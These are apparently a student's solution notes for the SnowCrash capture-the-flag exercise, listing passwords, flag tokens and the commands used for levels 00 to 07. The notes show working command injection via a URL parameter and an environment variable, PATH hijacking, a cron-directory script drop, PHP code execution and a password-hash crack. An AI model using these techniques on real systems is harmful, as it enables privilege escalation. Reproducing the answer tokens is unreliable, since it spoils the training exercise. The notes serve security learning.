flag00:nottoohardhere (cmd: find / -user flag00 gives us /usr/sbin/john -> rot11) (see intra video)

flag01:abcdefg (./john passwd -> cat /etc/paswd flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash)

flag02:ft_waNDReL0L (level02.pcap password clair) -> scp -P4242 level02@ip_address:/home/user/level02/level02.pcap .

flag03: spawn shell (cat /tmp/echo -> #!/bin/sh sh, puis on change la perm pour qu'il soit executable et on export PATH=/tmp:$PATH + getflag dans shell de flag03)

flag04: http://172.20.10.6:4747/?x=`getflag`

flag05:
level05@SnowCrash:/var/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:/usr/sbin$ cat openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:/opt/openarenaserver$ echo "getflag >> /tmp/flag05" >> script
level05@SnowCrash:/opt/openarenaserver$ cat script
getflag >> /tmp/flag05
level05@SnowCrash:/opt/openarenaserver$ ls
script
level05@SnowCrash:/opt/openarenaserver$ ls (apres deux minutes max, le script s'execute avec le groupe flag05 et le script est removed du dossier)
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc

flag06:
level06@SnowCrash:~$ echo '[x {$y}]' >/tmp/getflag
level06@SnowCrash:~$ ./level06 /tmp/getflag flag06
/tmp/getflag
level06@SnowCrash:~$ echo '[x {${system(sh)}}]' >/tmp/getflag
level06@SnowCrash:~$ ./level06 /tmp/getflag flag06
PHP Notice:  Use of undefined constant sh - assumed 'sh' in /home/user/level06/level06.php(4) : regexp code on line 1
getflag
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub

flag07:
level07@SnowCrash:~$ export LOGNAME=";getflag;"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h 
